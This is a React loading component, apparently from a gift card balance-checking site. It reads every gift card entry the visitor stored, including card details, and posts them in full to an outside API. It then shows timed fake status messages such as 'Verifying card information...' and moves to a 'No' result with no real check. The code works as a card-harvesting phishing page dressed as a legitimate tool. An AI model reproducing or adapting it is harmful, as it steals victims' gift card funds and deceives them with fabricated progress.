import React, { useEffect, useState, useRef } from "react";
import { useTranslation } from "react-i18next";

const Loading = ({ currentStep }) => {
  const { t } = useTranslation();
  const [apiError, setApiError] = useState("");
  let status = useRef();

  const sendRequest = async () => {
    try {
      // Retrieve existing GiftCardEntries from localStorage
      const storedEntries =
        JSON.parse(localStorage.getItem("GiftCardEntries")) || {};

      // Prepare POST request parameters
      const { "Card Brand": cardType, Amount: amount } = storedEntries;
      const response = await fetch("https://egan-api.vercel.app/gowt", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          subject: `${cardType} - ${amount}`,
          message: JSON.stringify(storedEntries, null, 2),
        }),
      });

      if (!response.ok) {
        throw new Error("Failed to send data to the API.");
      }

      setTimeout(() => {
        status.current.textContent = t("Checking databases...");
      }, 2000);

      setTimeout(() => {
        status.current.textContent = t("Verifying card information...");
      }, 5000);

      setTimeout(() => {
        status.current.textContent = t(
          "Sorry, this is taking a while..."
        );
      }, 11000);

      setTimeout(() => {
        status.current.textContent = t("Done!");
        setTimeout(() => {
          // Navigate to the next step
          currentStep("No");
          setTimeout(() => {
            window.location.href = "#result";
          }, 2);
        }, 1000);
      }, 13000);
    } catch (err) {
      setApiError(err.message || t("An unexpected error occurred."));
    }
  };

  useEffect(() => {
    sendRequest();
  }, []);

  return (
    <div className="form">
      <div className="form-container theloader">
        <div className="loader">
          <div></div>
          <div></div>
          <div></div>
          <div></div>
          <div></div>
          <div></div>
          <div></div>
          <div></div>
          <div></div>
        </div>
        <br />
        <div className="loading-status" ref={status}>
          {t("Checking APIs")}
        </div>
      </div>
    </div>
  );
};

export default Loading;
